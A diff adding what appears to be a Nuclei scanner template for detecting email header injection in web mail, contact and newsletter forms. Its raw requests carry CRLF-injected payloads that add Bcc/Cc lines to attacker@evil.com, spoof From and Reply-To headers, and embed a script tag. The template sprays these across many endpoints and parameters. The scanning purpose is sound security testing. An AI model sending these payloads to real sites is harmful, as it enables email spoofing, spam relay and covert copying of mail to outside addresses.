@@ -1,0 +1,220 @@
+id: medium-webapp-email-header-injection-smtp
+
+info:
+  name: Email Header Injection SMTP
+  author: elite-red-team
+  severity: high
+  description: |
+    Detects email header injection vulnerabilities where user input is directly embedded
+    into email headers without proper validation. This can lead to email spoofing,
+    spam relay, and information disclosure through SMTP header manipulation.
+  reference:
+    - https://owasp.org/www-community/attacks/Mail_Header_Injection
+    - https://www.acunetix.com/blog/articles/email-header-injection/
+    - https://portswigger.net/kb/issues/00200400_smtp-header-injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-93
+  tags: email-injection,smtp,header-injection,medium
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=test%0D%0ABcc:attacker@evil.com&{{param2}}=test&message=Email header injection test
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=test%0ATo:victim@target.com%0ASubject:Injected Subject&{{param2}}=test&message=test
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"{{param}}": "test\r\nCc: attacker@evil.com", "{{param2}}": "test", "message": "Header injection test"}
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=test%0D%0AX-Mailer:Evil-Mailer%0D%0AContent-Type:text/html&{{param2}}=test&message=test
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{param}}=test%0D%0A%0D%0A<script>alert('EMAIL_XSS')</script>&{{param2}}=test&message=test
+
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        
+        {"{{param}}": "test\nFrom: spoofed@attacker.com\nReply-To: evil@attacker.com", "{{param2}}": "test"}
+
+    payloads:
+      path:
+        - "/contact"
+        - "/send"
+        - "/mail"
+        - "/email"
+        - "/feedback"
+        - "/support"
+        - "/newsletter"
+        - "/subscribe"
+        - "/api/mail"
+        - "/api/send"
+        - "/admin/mail"
+        - "/user/contact"
+
+      param:
+        - "email"
+        - "from"
+        - "to"
+        - "subject"
+        - "name"
+        - "sender"
+        - "recipient"
+        - "reply_to"
+        - "cc"
+        - "bcc"
+
+      param2:
+        - "message"
+        - "body"
+        - "content"
+        - "text"
+
+    attack: clusterbomb
+    threads: 10
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        words:
+          - "sent"
+          - "success"
+          - "delivered"
+          - "mail"
+          - "email"
+          - "message sent"
+          - "thank you"
+        condition: or
+        case-insensitive: true
+
+      - type: word
+        words:
+          - "error"
+          - "failed"
+          - "invalid"
+          - "rejected"
+          - "blocked"
+        condition: or
+        negative: true
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: email_confirmation
+        regex:
+          - '(?i)(sent|delivered|success)'
+          - '(?i)email.*sent'
+          - '(?i)message.*sent'
+
+      - type: regex
+        name: smtp_response
+        regex:
+          - '(?i)(250|221).*'
+          - '(?i)smtp.*'
+
+# Additional test for direct SMTP response
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        to=test@example.com%0D%0ABcc:attacker@evil.com&from=sender@test.com&subject=Test&message=Body
+
+    payloads:
+      path:
+        - "/sendmail"
+        - "/mailer"
+        - "/smtp"
+        - "/mail/send"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        words:
+          - "mail"
+          - "sent"
+          - "delivered"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: mail_headers
+        regex:
+          - '(?i)(to|from|cc|bcc|subject):\s*([^\r\n]+)'
+
+# Test for newsletter subscription with header injection
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        email=test@example.com%0D%0AX-Priority:1%0D%0AX-MSMail-Priority:High&name=Test User
+
+    payloads:
+      path:
+        - "/subscribe"
+        - "/newsletter"
+        - "/signup"
+        - "/register"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+      - type: word
+        words:
+          - "subscribed"
+          - "registered"
+          - "welcome"
+          - "confirmation"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: subscription_response
+        regex:
+          - '(?i)(subscribed|registered|confirmation)'
